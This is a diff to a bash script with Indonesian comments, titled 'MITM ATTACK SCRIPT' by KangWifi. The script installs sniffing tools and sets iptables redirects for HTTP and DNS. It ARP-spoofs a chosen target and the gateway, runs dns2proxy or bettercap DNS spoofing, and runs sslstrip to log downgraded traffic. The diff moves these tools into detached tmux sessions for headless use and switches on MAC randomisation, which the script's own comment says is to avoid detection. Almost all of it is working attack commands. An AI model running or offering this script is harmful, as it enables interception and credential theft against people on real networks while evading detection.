@@ -27,10 +27,10 @@ echo 0 > /proc/sys/net/ipv4/conf/all/accept_redirects
 echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
 echo -e "$green[✔] ICMP Redirect Blocking diaktifkan"
 
-# Cek & install dependensi dari APT atau GitHub jika gagal
+# Cek & install dependensi
 function install_pkg() {
     if ! command -v $1 &>/dev/null; then
-        echo -e "$red[!] $1 tidak ditemukan, mencoba menginstall..."
+        echo -e "$red[!] $1 tidak ditemukan, menginstall..."
         apt-get install -y $1 || {
             echo -e "$yellow[!] Instalasi gagal dari APT, mencoba dari GitHub..."
             if [ "$1" == "sslstrip" ]; then
@@ -50,7 +50,7 @@ function install_pkg() {
 }
 
 # Daftar paket yang akan diinstal
-deps=(xterm dsniff sslstrip dns2proxy bettercap nmap net-tools figlet)
+deps=(tmux dsniff sslstrip dns2proxy bettercap nmap net-tools figlet)
 
 # Install semua paket yang dibutuhkan
 for pkg in "${deps[@]}"; do
@@ -58,16 +58,16 @@ for pkg in "${deps[@]}"; do
     sleep 1
 done
 
-# Aktifkan IP Forwarding
-echo "1" > /proc/sys/net/ipv4/ip_forward
-echo -e "$green[✔] IP Forwarding diaktifkan"
-
 clear
 
 # Banner MITM ATTACK SCRIPT setelah instalasi selesai
 echo -e "$cyan"
 figlet "MITM ATTACK SCRIPT"
-echo -e "$yellow By Kangwifi$transparent"
+echo -e "$yellow By KangWifi$transparent"
+
+# Aktifkan IP Forwarding
+echo "1" > /proc/sys/net/ipv4/ip_forward
+echo -e "$green[✔] IP Forwarding diaktifkan"
 
 # Scan perangkat dalam jaringan
 echo -e "$yellow[+] Memindai perangkat dalam jaringan...$transparent"
@@ -84,31 +84,34 @@ read ipg
 echo -e "$yellow[+] Menjalankan serangan MITM...$transparent"
 
 # Konfigurasi iptables untuk redirect HTTP dan DNS
-iptables --flush -t nat
-iptables --flush
+iptables -t nat -F
+iptables -F
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
+iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 5353
 
 # Menyamarkan MAC Address agar sulit dideteksi
-// ifconfig $interface down
-// macchanger -r $interface
-// ifconfig $interface up
-// echo -e "$green[✔] MAC Address diacak untuk menghindari deteksi"
+ifconfig $interface down
+macchanger -r $interface
+ifconfig $interface up
+echo -e "$green[✔] MAC Address diacak untuk menghindari deteksi"
 
-# Menjalankan arpspoof
-xterm -hold -title "ARP Spoof: Target -> Gateway" -e "arpspoof -i $interface -t $ipt $ipg > /dev/null 2>&1" &
-xterm -hold -title "ARP Spoof: Gateway -> Target" -e "arpspoof -i $interface -t $ipg $ipt > /dev/null 2>&1" &
+# Pastikan sslstrip log ada sebelum tailing
+touch sslstrip.log
+
+# Menjalankan arpspoof dengan `tmux` (lebih stabil di headless server)
+tmux new-session -d -s arpspoof1 "arpspoof -i $interface -t $ipt $ipg > /dev/null 2>&1"
+tmux new-session -d -s arpspoof2 "arpspoof -i $interface -t $ipg $ipt > /dev/null 2>&1"
 
 # Menjalankan dns2proxy atau bettercap jika dns2proxy gagal
-xterm -hold -title "DNS2Proxy" -e "cd /usr/share/dns2proxy && python3 dns2proxy.py > /dev/null 2>&1" &
+tmux new-session -d -s dns2proxy "cd /usr/share/dns2proxy && python3 dns2proxy.py > /dev/null 2>&1"
 sleep 5
 if ! pgrep -f dns2proxy.py > /dev/null; then
     echo -e "$red[!] dns2proxy gagal, menggunakan bettercap sebagai alternatif"
-    xterm -hold -title "Bettercap" -e "bettercap -iface $interface -caplet dns-spoof > /dev/null 2>&1" &
+    tmux new-session -d -s bettercap "bettercap -iface $interface -caplet dns-spoof > /dev/null 2>&1"
 fi
 
 # Menjalankan sslstrip2 dan memantau log
-xterm -hold -title "SSLStrip2" -e "sslstrip -l 8080 -w sslstrip.log > /dev/null 2>&1" &
+tmux new-session -d -s sslstrip "sslstrip -l 8080 -w sslstrip.log > /dev/null 2>&1"
 
 echo -e "$green[✔] MITM Attack sedang berjalan. Tekan CTRL+C untuk berhenti.$transparent"
 
